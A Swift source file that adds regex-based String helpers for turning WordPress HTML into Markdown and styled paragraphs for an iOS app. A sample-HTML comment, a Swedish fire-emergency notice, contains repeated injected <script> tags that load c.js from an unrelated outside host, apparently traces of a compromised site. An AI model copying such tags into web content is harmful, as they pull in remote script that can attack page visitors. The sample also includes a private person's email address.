//
//  String+regex.swift
//  Vatterso
//
//  Created by Kristoffer Anger on 2023-08-09.
//

import Foundation
import RegexBuilder
import SwiftUI

extension String {
    
    func trimmed() -> String {
        return self.trimmingCharacters(in: CharacterSet.whitespacesAndNewlines)
    }
    
    // simple method to remove all tags
    func htmlStripped() -> String {
        let pattern = "<[^>]+>"
        let stripped = self.trimmed().replacingOccurrences(of: pattern, with: "", options: .regularExpression, range: nil)
        return stripped
    }
    
    // Replace HTML comments, in the format <!-- ... comment ... -->
    func removeBetween(prefix: String, suffix: String) -> String {
        var text = self
        var loop = true

        // Stop looking when none is found
        while loop {
            
            // Retrieve
            let searchComment = Regex {
                Capture {
                    // start of html tag
                    prefix
                    ZeroOrMore(.any, .reluctant)
                    //end of html tag
                    suffix
                }
            }
            if let match = text.firstMatch(of: searchComment) {
                let (_, comment) = match.output
                text = text.replacing(comment, with: "")
            } else {
                loop = false
            }
        }
        return text
    }
    
    // replacing all substrings with one string
    func replace(substrings: [String], with string: String) -> String {
        var text = self
        for substring in substrings {
            text = text.replacing(substring, with: string)
        }
        return text
    }
    
    // Replace hyperlinks block
    func replaceHyperlinks() -> String {
        var text = self
        var loop = true
        // Stop looking for hyperlinks when none is found
        while loop {
            // Retrieve hyperlink
            let searchHyperlink = Regex {
                // A hyperlink that is embedded in an HTML tag in this format: <a... href="<hyperlink>"....>
                "<a"
                // There could be other attributes between <a... and href=...
                // .reluctant parameter: to stop matching after the first occurrence
                ZeroOrMore(.any)
                
                // We could have href="..., href ="..., href= "..., href = "...
                "href"
                ZeroOrMore(.any)
                "="
                ZeroOrMore(.any)
                "\""
                // Here is where the hyperlink (href) is captured
                Capture {
                    ZeroOrMore(.any)
                }
                "\""
                // After href="<hyperlink>", there could be a ">" sign or other attributes
                ZeroOrMore(.any)
                ">"
                // Here is where the linked text is captured
                Capture {
                    ZeroOrMore(.any, .reluctant)
                }
                One("</a>")
            }.repetitionBehavior(.reluctant)
            
            if let match = text.firstMatch(of: searchHyperlink) {
                let (hyperlinkTag, href, content) = match.output
                let markDownLink = "[" + content + "](" + href + ")"
                text = text.replacing(hyperlinkTag, with: markDownLink)
            } else {
                loop = false
            }
        }
        return text
    }
    // split text into paragraphs with text, font, and image and more
    func createParagraphs() -> [WPParagraph] {
        
        /*
         <p><span style=\"font-size: 12pt;\"> Vid nödsituation:</span></p>\n<p><span style=\"color: #ff0000; font-size: 18pt;\">Ring 112 och kalla på brandkåren</span></p>\n<p><strong><span style=\"font-size: 12pt;\">Berätta exakt var det brinner &#8211; Wettersö ligger i Österåkers kommun, 3 mil rakt söder om Norrtälje.</span></strong><br />\n<strong> <span style=\"font-size: 12pt;\"> Lämna telefonnummer till en eller flera kontaktpersoner.</span></strong></p>\n<ul>\n<li><span style=\"font-size: medium;\">Använd </span> <span style=\"font-size: medium;\">VNSF </span><span style=\"font-size: medium;\">&amp; </span><span style=\"font-size: medium;\">SBFS </span><span style=\"font-size: medium;\">telefonlista</span><span style=\"font-size: medium;\"> </span><span style=\"font-size: medium;\"> för att sammankalla ALLA som är ute på öarna</span></li>\n<li><span style=\"font-size: medium;\">Starta brandsirénen vid dansbanan, strömbrytaren sitter i mätarskåpet på stolpen</span></li>\n<li><span style=\"font-size: medium;\">Tag med mobiltelefon med reservbatteri, skottkärra, hinkar, vattenkannor med stril och räfsor eller krattor av metall och mycket vatten att dricka. Kanske något att äta också?</span></li>\n<li><span style=\"font-size: medium;\">Samling sker vid brandsprutan som står i spannmålsmagasinet intill stallet, se <script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><a href=\"http://www.cmswds.wetterso.se/brand/brand/brand_w_map.htm\">karta</a></span></li>\n<li><span style=\"font-size: medium;\">Utse en brandchef och skriv ner era mobiltelefonnummer på varsin lista så att ni kan kommunicera</span></li>\n<li><span style=\"font-size: medium;\">Brandslangarna kan köras ut med skottkärra om ingen traktor finns tillgänglig</span></li>\n<li><span style=\"font-size: medium;\">Brandsprutan skall placeras vid sjöstranden närmast brandplatsen &#8211; det blir troligen någon av betongbryggorna som det finns bilväg till och där vattendjupet är tillräckligt</span></li>\n<li><span style=\"font-size: medium;\"><span style=\"font-size: medium;\">O.B.S att sugslangen måste skyddas med en hink för att förhindra att grus sugs in i pumpen</span></span></li>\n<li><strong>Läs mer: <script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><a href=\"https://media.wetterso.se/2015/08/I-händelse-av-eldsvåda.pdf\">I händelse av eldsvåda</a></strong></li>\n</ul>\n<p>&nbsp;</p>\n<p>Branden i Västmanland sommaren 2014 väcker frågor kring vår beredskap att släcka bränder på ön. Befintlig brandslang är gammal och svårhanterlig och inget system finns för effektiv förflyttning av slangen. Vi har heller ingen larmkedja. VFFF är den förening som ansvarar för brandfrågor. Föreningen kommer att arbeta fram nya förslag för bättre brandberedskap under året fram till nästa stämma 2015. Hör gärna av dig med egna förslag, och om du vill engagera dig i frågan – välkommen! Maila VFFF:s ordförande <script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><a href=\"mailto:t_westerlund@hotmail.com\">Torbjörn Westerlund</a>. t_westerlund@hotmail.com</p>\n",
         */
        
        func processString(string: String, paragraphs: [WPParagraph]) -> [WPParagraph] {
            // try matching paragraphs, starts with a "<p>", "<p style...>" and ends with a "</p>"
            let paragraphRegex = Regex {
                ChoiceOf {
                    "<p><span"
                    "<p>**<span"
                    "<p"
                    "<h2"
                    "<figure"
                }
                ZeroOrMore(.any)
                // font size is captured (optional)
                Optionally {
                    "style"
                    // step forward
                    OneOrMore(.any)
                    // try capture color
                    Optionally {
                        "color:"
                        ZeroOrMore( .whitespace)
                        // capture size
                        TryCapture {
                            ZeroOrMore(.any)
                        } transform: {
                            String($0)
                        }
                        ";"
                        ZeroOrMore(.any)
                    }
                    // font size starts with font-size:
                    "font-size:"
                    ZeroOrMore( .whitespace)
                    // capture size
                    TryCapture {
                        ZeroOrMore(.any)
                    } transform: {
                        Float($0)
                    }
                    // size ends with px or pt
                    "p"
                    // could include other styles too
                    ZeroOrMore(.any)
                }
                // end of initial tag
                ">"
                // capture either image url or text
                ChoiceOf {
                    // image url is captured (optional)
                    Optionally {
                        "[<img"
                        OneOrMore(.any)
                        ">]"
                        // url is captured
                        "("
                        Capture {
                            OneOrMore(.any)
                        }
                        ")"
                    }
                    // text is captured
                    Capture {
                        ZeroOrMore(.any)
                    } transform: {
                        String($0)
                    }
                }
                // text ends right before end mark, ex </p>
                Optionally {
                    "</span>"
                    ZeroOrMore(.any)
                }
                ChoiceOf {
                    "</p>"
                    "</h2>"
                    "</figure>"
                }
            }.repetitionBehavior(.reluctant)
            
            // get first match
            if let match = string.firstMatch(of: paragraphRegex) {
                let (paragraph, textColor, fontSize, imageUrl, text) = match.output
                
                // handle font
                var font: Font
                if let fontSize {
                    font = Font.system(size: CGFloat(fontSize))
                }
                else {
                    font = Font.body
                }
                
                var color: Color? = nil
                if let textColor, let wrappedValue = textColor {
                    color = Color.hex(wrappedValue)
                }
                
                // handle url
                var url: URL? = nil
                if let imageUrl, let wrappedValue = imageUrl {
                    url = URL(string: String(wrappedValue))
                }
                // create paragraph
                let newParagraph = WPParagraph(text: text, font: font, color: color, imageUrl: url)
   
                // call method recursively (with match removed) until all matches are found
                return processString(string: string.replacing(paragraph, with: ""), paragraphs: paragraphs + [newParagraph])
            }
            else {
                // return list of created paragraphs
                return paragraphs
            }
        }
        // start recusion with self and an empty arrray
        return processString(string: self, paragraphs: [WPParagraph]())
    }
    
    // translate html tags to markdown text
    func htmlToMarkDown() -> String {
        return self.removeBetween(prefix:"<!--", suffix: "-->") // remove comments like "<!-- ... comment ... -->"
            .removeBetween(prefix:"<script", suffix: "/script>") // remove java scripts
            .replace(substrings: ["\n", "</div>"], with: "")  // replace elements with nothing
            .replace(substrings: ["<div>", "<br>", "<br />"], with: "\n") // add linebreak

            .replace(substrings: ["<strong>", "</strong>", "<b>", "</b>"], with: "**") // add bold text
            .replace(substrings: ["<em>", "</em>", "<i>", "</i>"], with: "*") // add italic text
            .replaceHyperlinks() // replace pattern <a... href="<hyperlink>"....> with [content](href)

    }
}
